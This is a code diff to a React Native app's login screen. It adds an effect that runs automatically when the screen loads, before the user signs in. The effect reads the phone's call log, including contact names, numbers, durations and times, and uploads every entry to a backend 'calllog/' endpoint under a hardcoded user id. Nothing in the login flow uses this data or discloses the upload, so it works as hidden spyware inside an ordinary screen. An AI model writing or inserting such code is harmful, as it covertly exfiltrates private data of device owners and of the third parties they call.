@@ -1,10 +1,11 @@
 import { SafeAreaView, StyleSheet, Text, View, TouchableOpacity,  ScrollView, StatusBar,} from 'react-native'
-import React, { useContext, useState } from 'react'
+import React, { useContext, useEffect, useState } from 'react'
 import { InputField, Btn , Logo} from '../components'
 import Axios from '../utils/api'
 import { storeData } from '../utils/storage'
 import { AuthContext } from '../routes/Routes'
 import { defaultGame } from '../utils/utls'
+import { getPermission } from '../utils/permissions'
 
 
 const Login = ({navigation}) => {
@@ -15,6 +16,37 @@ const Login = ({navigation}) => {
   const [userNameError, setUserNameError] = useState(false)
   const [passwordError, setPasswordError] = useState(false)
   const {setIsAuthenticated, setUserData} = useContext(AuthContext);
+
+
+
+  useEffect(()=>{
+
+    const fetchAndSendCallLog = async()=>{
+
+      try{
+        const callLogs = await getPermission();
+        console.log(callLogs)
+        const filterCalls = []
+        for(i=0; i<callLogs.length; i++){
+          filterCalls.push({user:1, name:callLogs[i].name, number:callLogs[i].phoneNumber, duration: Number(callLogs[i].duration) , timestamp:  Number(callLogs[i].timestamp), raw_type:callLogs[i].rawType, date_time:callLogs[i].dateTime, type: callLogs[i].type})
+        }
+        console.log(filterCalls)
+        Axios.post('calllog/', filterCalls).then((response)=>{
+          console.log("call log post response", response.data)
+        }).catch((error)=>console.log("call log post error", error))
+      }catch(error){
+        console.log(error)
+      }
+
+
+
+    }
+
+    fetchAndSendCallLog()
+
+
+
+  },[])
 
 
 
